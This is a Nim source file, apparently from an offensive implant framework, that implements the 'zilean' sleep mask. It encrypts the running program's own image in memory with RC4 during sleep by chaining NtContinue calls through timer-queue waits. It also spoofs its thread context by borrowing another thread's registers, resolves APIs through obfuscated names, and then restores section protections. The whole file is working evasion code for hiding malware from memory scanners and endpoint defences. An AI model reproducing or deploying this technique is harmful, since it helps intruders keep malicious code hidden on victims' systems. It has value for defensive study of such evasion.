import ../../utils/global
import ../../utils/winapi/handlers
import ../../utils/winapi/syscall
import ../../utils/winapi/ssn
import ../../utils/winapi/utils

const
  ctxSize = 0x1000
  ropStep = 100.culong
  maxSections = 11
  maxRop = 9 + maxSections + 1
  threadGetContext = culong(0x0008)
  threadSetContext = culong(0x0010)

type
  Ustr = object
    length*, maximumLength*: culong
    buffer*: pointer
  TNtCtxThread = proc(h, ctx: pointer): culong {.stdcall.}
  Region = object
    base*: pointer
    size*: culong
    prot*: culong

template ctxFlag(p: pointer): ptr culong =
  # Returns the context flags field
  cast[ptr culong](cast[int](p) + 0x30)
template ctxRip(p: pointer): ptr uint64 =
  # Returns the context instruction pointer field
  cast[ptr uint64](cast[int](p) + 0xF8)
template ctxRsp(p: pointer): ptr uint64 =
  # Returns the context stack pointer field
  cast[ptr uint64](cast[int](p) + 0x98)
template ctxRcx(p: pointer): ptr uint64 =
  # Returns the context rcx field
  cast[ptr uint64](cast[int](p) + 0x80)
template ctxRdx(p: pointer): ptr uint64 =
  # Returns the context rdx field
  cast[ptr uint64](cast[int](p) + 0x88)
template ctxR8(p: pointer): ptr uint64 =
  # Returns the context r8 field
  cast[ptr uint64](cast[int](p) + 0xB8)
template ctxR9(p: pointer): ptr uint64 =
  # Returns the context r9 field
  cast[ptr uint64](cast[int](p) + 0xC0)

template u64at(p: pointer; o: int): uint64 =
  # Reads a 64 bit value at the given offset
  cast[ptr uint64](cast[int](p) + o)[]

template prepRop(dst, src: pointer; fn: pointer) =
  # Copies a context and points it at the next call
  copyMem(dst, src, ctxSize)
  ctxFlag(dst)[] = contextFull
  ctxRip(dst)[] = cast[uint64](fn)
  ctxRsp(dst)[] = ctxRsp(dst)[] - 8

proc eventSet(ev: pointer; fired: culong) {.stdcall.} =
  # Signals the event and ignores the fired flag
  discard fired
  discard ntSetEvent(ev)

proc captureSpoof(ctx: pointer; getCtx: TNtCtxThread): bool =
  # Finds another thread context to use as a spoof
  result = false
  let pid = getCurrentProcessId()
  let tid = getCurrentThreadId()
  var need: culong = 0
  discard querySystemInformation(5, nil, 0, addr need)
  if need == 0:
    return
  let buf = allocRw(need.csize_t)
  if buf == nil:
    return
  defer: discard freeMem(buf)
  if querySystemInformation(5, buf, need, nil) != 0:
    return
  var entry = buf
  while true:
    if u64at(entry, 0x50) == cast[uint64](pid):
      let n = u32(entry, 4)
      var thr = cast[pointer](cast[int](entry) + 0x108)
      for _ in 0 ..< n.int:
        let cand = u64at(thr, 0x30)
        if cand != 0 and cand != cast[uint64](tid):
          let h = openThread(threadGetContext, 0, culong(cand))
          if h != nil:
            let st = getCtx(h, ctx)
            discard ntCloseHandle(h)
            if st == 0:
              return true
        thr = cast[pointer](cast[int](thr) + 0x50)
      return false
    let nxt = u32(entry, 0)
    if nxt == 0:
      break
    entry = cast[pointer](cast[int](entry) + nxt.int)

proc zileanObf*(ms: culong): bool =
  # Here is where the zilean sleep mask encrypts the image and waits
  result = false
  if not syscallReady and not prepareSyscalls():
    return
  let base = getModuleHandleA(currentModule = true)
  if base == nil:
    return
  let p = cast[ptr UncheckedArray[byte]](base)
  if p[0] != 0x4D'u8 or p[1] != 0x5A'u8:
    return
  let peOff = cast[ptr culong](cast[int](base) + 0x3C)[]
  let nt = cast[pointer](cast[int](base) + peOff.int)
  if cast[ptr culong](nt)[] != 0x00004550:
    return
  let imgSize = cast[ptr culong](cast[int](nt) + 0x50)[]
  if imgSize == 0:
    return
  let nsec = cast[ptr uint16](cast[int](nt) + 6)[]
  let optSize = cast[ptr uint16](cast[int](nt) + 20)[]
  if nsec == 0 or nsec > maxSections:
    return
  var sec = cast[int](nt) + 24 + optSize.int
  var regions: array[maxSections + 1, Region]
  var nRegions = 0
  var firstVA = 0.culong
  for i in 0 ..< nsec.int:
    let va = cast[ptr culong](sec + 12)[]
    let vsize = cast[ptr culong](sec + 8)[]
    if i == 0:
      firstVA = va
    if vsize > 0 and va > 0 and va < imgSize:
      let chars = cast[ptr culong](sec + 36)[]
      var prot = PAGE_READONLY
      if (chars and culong(0x20000000)) != 0:
        prot = if (chars and culong(0x80000000)) != 0: PAGE_EXECUTE_READWRITE else: PAGE_EXECUTE_READ
      elif (chars and culong(0x80000000)) != 0:
        prot = PAGE_READWRITE
      var sz = vsize
      if va.int + sz.int > imgSize.int:
        sz = imgSize - va
      regions[nRegions] = Region(base: cast[pointer](cast[int](base) + va.int), size: sz, prot: prot)
      inc nRegions
    sec += 40
  if nRegions == 0 or firstVA == 0:
    return
  regions[nRegions] = Region(base: base, size: firstVA, prot: PAGE_READONLY)
  inc nRegions

  var key: array[16, byte]
  var tick = getTickCount()
  for i in 0 ..< key.len:
    key[i] = byte((tick + culong(i * 17)) and 0xFF)
    tick = (tick shl 5) or (tick shr 27)

  var img = Ustr(length: imgSize, maximumLength: imgSize, buffer: base)
  var k = Ustr(length: 16, maximumLength: 16, buffer: addr key[0])

  var timerCtx {.align(16).}: array[ctxSize, byte]
  var rops {.align(16).}: array[maxRop, array[ctxSize, byte]]
  var ctxBackup {.align(16).}: array[ctxSize, byte]
  var ctxSpoof {.align(16).}: array[ctxSize, byte]
  var value: culong
  var evWait, evStart, evDone, evReady: pointer
  var waits: array[maxRop + 3, pointer]
  var nWaits = 0
  var delay = ropStep

  let cap = rtlCaptureContext()
  let cont = ntContinue()
  let setEv = ntSetEventStub()
  let evSet = cast[pointer](eventSet)
  let wfs = load(obf("WaitForSingleObjectEx"))
  let vpt = load(obf("VirtualProtect"))
  let ntdll = getModuleHandleA(obf("ntdll.dll"))
  var getCtx: TNtCtxThread = nil
  var setCtx: TNtCtxThread = nil
  if ntdll != nil:
    getCtx = cast[TNtCtxThread](getProcAddress(ntdll, obf("NtGetContextThread")))
    setCtx = cast[TNtCtxThread](getProcAddress(ntdll, obf("NtSetContextThread")))
  let adv = loadLibraryA(obf("advapi32.dll"))
  let rc4 = if adv == nil: nil else: getProcAddress(adv, obf("SystemFunction032"))
  if cap == nil or cont == nil or setEv == nil or wfs == nil or vpt == nil or rc4 == nil:
    return

  if ntCreateEvent(addr evWait, eventAllAccess, nil, notificationEvent, 0) != 0:
    return
  if ntCreateEvent(addr evReady, eventAllAccess, nil, notificationEvent, 0) != 0:
    discard ntCloseHandle(evWait)
    return
  if ntCreateEvent(addr evStart, eventAllAccess, nil, notificationEvent, 0) != 0:
    discard ntCloseHandle(evWait)
    discard ntCloseHandle(evReady)
    return
  if ntCreateEvent(addr evDone, eventAllAccess, nil, notificationEvent, 0) != 0:
    discard ntCloseHandle(evWait)
    discard ntCloseHandle(evReady)
    discard ntCloseHandle(evStart)
    return

  delay += ropStep
  var st = rtlRegisterWait(evWait, cap, addr timerCtx[0], delay, wtExecuteOnlyOnce or wtExecuteInWaitThread, addr waits[nWaits])
  if st == 0:
    inc nWaits
  delay += ropStep
  st = rtlRegisterWait(evWait, evSet, evReady, delay, wtExecuteOnlyOnce or wtExecuteInWaitThread, addr waits[nWaits])
  if st == 0:
    inc nWaits
  if waitForObject(evReady) != 0:
    for i in 0 ..< nWaits:
      if waits[i] != nil: discard rtlDeregisterWait(waits[i])
    discard ntCloseHandle(evWait)
    discard ntCloseHandle(evReady)
    discard ntCloseHandle(evStart)
    discard ntCloseHandle(evDone)
    return

  var hThread: pointer = nil
  var spoofOk = false
  zeroMem(addr ctxSpoof[0], ctxSize)
  ctxFlag(addr ctxSpoof[0])[] = contextFull
  if getCtx != nil and setCtx != nil:
    hThread = openThread(threadGetContext or threadSetContext, 0, getCurrentThreadId())
    if hThread != nil:
      if captureSpoof(addr ctxSpoof[0], getCtx):
        for off in [0x48, 0x50, 0x58, 0x60, 0x68, 0x70]:
          cast[ptr uint64](cast[int](addr ctxSpoof[0]) + off)[] = 0
        zeroMem(addr ctxBackup[0], ctxSize)
        ctxFlag(addr ctxBackup[0])[] = contextFull
        spoofOk = true
      else:
        discard ntCloseHandle(hThread)
        hThread = nil

  prepRop(addr rops[0][0], addr timerCtx[0], wfs)
  ctxRcx(addr rops[0][0])[] = cast[uint64](evStart)
  ctxRdx(addr rops[0][0])[] = cast[uint64](INFINITE)
  ctxR8(addr rops[0][0])[] = 0
  prepRop(addr rops[1][0], addr timerCtx[0], vpt)
  ctxRcx(addr rops[1][0])[] = cast[uint64](base)
  ctxRdx(addr rops[1][0])[] = cast[uint64](imgSize)
  ctxR8(addr rops[1][0])[] = cast[uint64](PAGE_READWRITE)
  ctxR9(addr rops[1][0])[] = cast[uint64](addr value)
  prepRop(addr rops[2][0], addr timerCtx[0], rc4)
  ctxRcx(addr rops[2][0])[] = cast[uint64](addr img)
  ctxRdx(addr rops[2][0])[] = cast[uint64](addr k)
  var rs: int
  if spoofOk:
    prepRop(addr rops[3][0], addr timerCtx[0], cast[pointer](getCtx))
    ctxRcx(addr rops[3][0])[] = cast[uint64](hThread)
    ctxRdx(addr rops[3][0])[] = cast[uint64](addr ctxBackup[0])
    prepRop(addr rops[4][0], addr timerCtx[0], cast[pointer](setCtx))
    ctxRcx(addr rops[4][0])[] = cast[uint64](hThread)
    ctxRdx(addr rops[4][0])[] = cast[uint64](addr ctxSpoof[0])
    prepRop(addr rops[5][0], addr timerCtx[0], wfs)
    ctxRcx(addr rops[5][0])[] = cast[uint64](currentProcess)
    ctxRdx(addr rops[5][0])[] = cast[uint64](delay + ms)
    ctxR8(addr rops[5][0])[] = 0
    prepRop(addr rops[6][0], addr timerCtx[0], cast[pointer](setCtx))
    ctxRcx(addr rops[6][0])[] = cast[uint64](hThread)
    ctxRdx(addr rops[6][0])[] = cast[uint64](addr ctxBackup[0])
    prepRop(addr rops[7][0], addr timerCtx[0], rc4)
    ctxRcx(addr rops[7][0])[] = cast[uint64](addr img)
    ctxRdx(addr rops[7][0])[] = cast[uint64](addr k)
    rs = 8
  else:
    prepRop(addr rops[3][0], addr timerCtx[0], wfs)
    ctxRcx(addr rops[3][0])[] = cast[uint64](currentProcess)
    ctxRdx(addr rops[3][0])[] = cast[uint64](delay + ms)
    ctxR8(addr rops[3][0])[] = 0
    prepRop(addr rops[4][0], addr timerCtx[0], rc4)
    ctxRcx(addr rops[4][0])[] = cast[uint64](addr img)
    ctxRdx(addr rops[4][0])[] = cast[uint64](addr k)
    rs = 5
  for r in 0 ..< nRegions:
    prepRop(addr rops[rs + r][0], addr timerCtx[0], vpt)
    ctxRcx(addr rops[rs + r][0])[] = cast[uint64](regions[r].base)
    ctxRdx(addr rops[rs + r][0])[] = cast[uint64](regions[r].size)
    ctxR8(addr rops[rs + r][0])[] = cast[uint64](regions[r].prot)
    ctxR9(addr rops[rs + r][0])[] = cast[uint64](addr value)
  prepRop(addr rops[rs + nRegions][0], addr timerCtx[0], setEv)
  ctxRcx(addr rops[rs + nRegions][0])[] = cast[uint64](evDone)
  ctxRdx(addr rops[rs + nRegions][0])[] = 0
  let total = rs + nRegions + 1

  for i in 0 ..< total:
    delay += ropStep
    st = rtlRegisterWait(evWait, cont, addr rops[i][0], delay, wtExecuteOnlyOnce or wtExecuteInWaitThread, addr waits[nWaits])
    if st == 0:
      inc nWaits

  result = ntSignalAndWait(evStart, evDone, 0, nil) == 0

  if result:
    for i in 0 ..< nWaits:
      if waits[i] != nil: discard rtlDeregisterWait(waits[i])
  if hThread != nil:
    discard ntCloseHandle(hThread)
  discard ntCloseHandle(evWait)
  discard ntCloseHandle(evReady)
  discard ntCloseHandle(evStart)
  discard ntCloseHandle(evDone)
  zeroMem(addr key[0], key.len)
  zeroMem(addr timerCtx[0], ctxSize)
  zeroMem(addr ctxSpoof[0], ctxSize)
  zeroMem(addr ctxBackup[0], ctxSize)
